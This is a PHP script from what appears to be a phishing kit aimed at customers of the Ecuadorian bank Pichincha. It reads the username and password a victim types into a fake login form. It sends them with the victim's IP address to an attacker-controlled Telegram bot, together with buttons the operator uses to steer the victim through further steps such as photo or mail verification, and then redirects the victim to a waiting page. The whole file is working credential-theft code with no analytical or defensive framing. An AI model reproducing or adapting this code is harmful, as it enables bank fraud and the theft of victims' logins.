<?php
include 'data.php';
session_start();

// Get the user's IP address
$ip = $_SERVER['REMOTE_ADDR'];

// Get the form data
$email = $_POST['us'];
$password = $_POST['ct'];

// Generate unique session ID for this user
$sessionId = md5($ip . time() . rand(1000, 9999));
$_SESSION['user_session_id'] = $sessionId;
$_SESSION['user_email'] = $email;

// Save session file (status: waiting)
$sessionFile = __DIR__ . '/sessions/' . $sessionId . '.txt';
file_put_contents($sessionFile, 'waiting');

// Check if the form data is set
if (isset($email) && isset($password)) {
    // Create the message with inline keyboard button
    $message = "USUARIO PICHInCHA:\n\n👤Usuario: $email\n🔑Pass: $password\n🌐IP: $ip";
    
    // Inline keyboard with buttons (sin Tarjeta en primer index)
    $keyboard = [
        'inline_keyboard' => [
            [
                ['text' => '📸 Pedir Foto', 'callback_data' => 'photo_' . $sessionId],
                ['text' => '❌ Login Error', 'callback_data' => 'incorrect_' . $sessionId]
            ],
            [
                ['text' => '📩 Mail', 'callback_data' => 'mail_' . $sessionId],
                ['text' => '✅ Listo', 'callback_data' => 'listo_' . $sessionId]
            ]
        ]
    ];
    
    // Send message with button
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $postData = [
        'chat_id' => $chatID,
        'text' => $message,
        'reply_markup' => json_encode($keyboard)
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}

// Redirect to waiting page
header('Location: charg.html');
exit;
?>